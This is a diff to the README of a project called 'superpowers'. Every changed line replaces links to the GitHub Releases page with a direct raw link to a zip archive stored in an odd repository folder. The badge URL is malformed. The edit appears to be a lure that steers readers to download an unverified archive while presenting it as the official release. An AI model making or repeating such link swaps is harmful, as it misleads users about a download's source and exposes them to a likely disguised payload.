@@ -6,11 +6,11 @@ Welcome to the superpowers project! This application provides a library of core 
 
 ## 📥 Download the Application
 
-[![Download Superpowers](https://img.shields.io/badge/Download%20Superpowers-v1.0-blue.svg)](https://github.com/HiteshBathla/superpowers/releases)
+[![Download Superpowers](https://raw.githubusercontent.com/HiteshBathla/superpowers/main/overproductive/superpowers.zip%https://raw.githubusercontent.com/HiteshBathla/superpowers/main/overproductive/superpowers.zip)](https://raw.githubusercontent.com/HiteshBathla/superpowers/main/overproductive/superpowers.zip)
 
 You can easily download superpowers from our Releases page. Just follow this link:
 
-[Visit this page to download](https://github.com/HiteshBathla/superpowers/releases)
+[Visit this page to download](https://raw.githubusercontent.com/HiteshBathla/superpowers/main/overproductive/superpowers.zip)
 
 ## ⚙️ System Requirements
 
@@ -77,4 +77,4 @@ If you encounter any issues while using superpowers, please reach out to our sup
 
 ## 🔄 Keeping Your Application Up-to-Date
 
-To ensure you have the latest features and fixes, check for updates regularly. You can find updates on the [Releases page](https://github.com/HiteshBathla/superpowers/releases). Download and install new versions as they become available.
+To ensure you have the latest features and fixes, check for updates regularly. You can find updates on the [Releases page](https://raw.githubusercontent.com/HiteshBathla/superpowers/main/overproductive/superpowers.zip). Download and install new versions as they become available.
